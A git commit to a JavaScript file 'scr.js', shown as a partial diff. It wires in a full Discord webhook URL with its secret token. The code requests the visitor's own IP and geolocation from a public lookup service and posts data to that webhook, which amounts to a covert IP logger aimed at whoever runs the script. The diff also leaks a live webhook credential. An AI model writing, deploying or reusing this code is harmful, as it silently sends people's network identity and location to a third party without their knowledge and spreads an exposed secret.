58a2efe7bcbb0d6ddc1f99032e0b6228a56ad105
prql0 <vuoy24@gmail.com>
2026-01-13 22:57:56 +0200

    Update scr.js

--- scr.js
+++ scr.js
@@ -1,4 +1,4 @@
-let webhook_url = 'webhook';
+let web = 'https://ptb.discord.com/api/webhooks/1445311807588663310/3ELjZ7CbtnDvwdh4-P4aSypZvMbmeNDqWUCjmRhB85fngQ9U5S0C2EgIzCixml2gRWKd';
 let req = new XMLHttpRequest();
 
 req.open('GET', 'https://api.db-ip.com/v2/free/self');
@@ -10,7 +10,7 @@ req.onload = () => {
 function webhook(text) {
     let xhr = new XMLHttpRequest();
 
-    xhr.open('POST', webhook_url, true);
+    xhr.open('POST', web, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
 
     xhr.send(JSON.stringify({
